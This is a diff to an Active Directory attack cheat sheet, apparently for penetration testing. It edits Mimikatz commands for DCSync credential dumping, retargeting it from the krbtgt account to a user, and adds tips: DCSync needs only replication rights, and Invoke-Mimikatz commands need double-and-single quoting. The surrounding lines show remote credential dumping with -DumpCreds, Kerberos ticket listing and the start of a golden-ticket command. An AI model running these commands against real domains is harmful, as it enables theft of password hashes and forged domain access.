@@ -157,8 +157,9 @@ Invoke-AllChecks
 
 NTLM == RC4
 #### DCSync
+Does NOT need localadmin to run, just DC Replication privs:
 ```
-lsadump::dcsync /user:<domain>\krbtgt
+lsadump::dcsync /user:Bob
 ```
 #### Golden
 
@@ -217,9 +218,11 @@ If functions not on remote host:-
 
 ```Invoke-Mimikatz -ComputerName -DumpCreds```
 
+When invoking command make sure to wrap in double AND single quotes - 
+
 ```Invoke-Mimikatz -ComputerName -Command "kerberos::list"```
 
-```Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'```
+```Invoke-Mimikatz -Command '"lsadump::dcsync /user:Bob"'```
 
 ``` 
 Invoke-Mimikatz -Command '"kerberos::golden 
